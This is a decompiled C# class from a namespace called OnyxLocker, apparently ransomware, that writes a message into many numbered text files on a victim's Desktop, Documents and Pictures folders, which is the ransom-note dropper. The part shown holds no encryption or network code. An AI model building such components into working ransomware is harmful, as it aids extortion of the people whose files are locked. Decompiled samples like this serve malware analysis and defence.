using System;
using System.IO;

namespace OnyxLocker.Classes
{
	// Token: 0x0200000C RID: 12
	internal class MessageWriter
	{
		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000020 RID: 32 RVA: 0x000029B7 File Offset: 0x00000BB7
		private string Message { get; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000021 RID: 33 RVA: 0x000029BF File Offset: 0x00000BBF
		private string FileName { get; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000022 RID: 34 RVA: 0x000029C7 File Offset: 0x00000BC7
		private int MessageCount { get; }

		// Token: 0x06000023 RID: 35 RVA: 0x000029CF File Offset: 0x00000BCF
		public MessageWriter(string message, string fileName, int messageCount)
		{
			this.Message = message;
			this.FileName = fileName;
			this.MessageCount = messageCount;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000029F0 File Offset: 0x00000BF0
		public void WriteMessageToDesktop()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			this.WriteMessages(folderPath, this.Message, this.MessageCount, this.FileName);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002A20 File Offset: 0x00000C20
		public void WriteMessageToDocuments()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			this.WriteMessages(folderPath, this.Message, this.MessageCount, this.FileName);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002A50 File Offset: 0x00000C50
		public void WriteMessageToPictures()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
			this.WriteMessages(folderPath, this.Message, this.MessageCount, this.FileName);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002A80 File Offset: 0x00000C80
		private void WriteMessages(string folderPath, string message, int messageCount, string fileName)
		{
			for (int i = 0; i < messageCount; i++)
			{
				string path = string.Format("{0} {1} .txt", fileName, i);
				string path2 = Path.Combine(folderPath, path);
				FileStream fileStream;
				FileStream stream = fileStream = new FileStream(path2, FileMode.OpenOrCreate);
				try
				{
					StreamWriter streamWriter2;
					StreamWriter streamWriter = streamWriter2 = new StreamWriter(stream);
					try
					{
						streamWriter.WriteLine(message);
					}
					finally
					{
						if (streamWriter2 != null)
						{
							((IDisposable)streamWriter2).Dispose();
						}
					}
				}
				finally
				{
					if (fileStream != null)
					{
						((IDisposable)fileStream).Dispose();
					}
				}
			}
		}
	}
}
